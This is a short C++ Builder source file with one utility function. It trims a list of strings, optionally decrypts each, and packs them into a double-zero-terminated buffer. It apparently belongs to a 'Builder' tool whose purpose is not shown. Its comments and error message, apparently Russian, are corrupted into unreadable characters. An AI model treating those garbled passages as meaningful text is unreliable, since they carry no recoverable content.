//---------------------------------------------------------------------------


#pragma hdrstop

#include "BuilderUtils.h"
#include "Memory.h"
#include "Crypt.h"
#include "Strings.h"

//---------------------------------------------------------------------------

char ERROR_MEMALLOC[] = "������ ��������� ������!";



bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
									bool CryptLines, bool TrimLines,
									PCHAR &OutBuf, DWORD &OutBufSize)
{
	//  ������� ����������� ������ � ���� ������. ������ ������ �����
	//  �������� ������� ��������. � ����� ��������� ������ ����� ������
	//  ��� ������� �������. ������ ������ ����� ���������������.

	if (Lines == NULL || Lines->Count == 0)
		return false;

	OutBuf = NULL;
	OutBufSize = 0;


	UnicodeString S;


	// ���������� ����� ������ � ������� ������ ������
	for (int i = Lines->Count - 1; i >= 0; i--)
    {
		S = Lines->Strings[i];
		DWORD OldLength = S.Length();

		if (TrimLines)
			S = S.Trim();

		if (S.Length() == 0)
			Lines->Delete(i);
		else
		{
			if (TrimLines && S.Length() != OldLength)
				Lines->Strings[i] = S;
			OutBufSize += S.Length() + 1;
        }
	}
	if (OutBufSize == 0) return false;

	OutBufSize++; // ����������� ����� ��� ��������������� ����

	// �������� ������
	OutBuf = (PCHAR)MemAlloc(OutBufSize);
	if (OutBuf == NULL)
	{
		throw Exception(ERROR_MEMALLOC);
    }

    PCHAR Tmp = OutBuf;

	// �������� ������
	for (int i = 0; i < Lines->Count; i++)
    {
		S = Lines->Strings[i];
		// �������� ������
		DWORD SL = S.Length();
		PCHAR Line = NULL;

		if (CryptLines)
		{
			Line = STR::Alloc(SL);
			Decrypt(S.t_str(), Line);
		}
		else
			Line = S.t_str();

		m_memcpy(Tmp, Line, SL);

		if (CryptLines)
			STR::Free(Line);

		// ������� ���������
		Tmp += SL;
		*Tmp = 0;
		Tmp++;
	}

	// ��������� �������������� ����
	*Tmp = 0;

	return true;
}


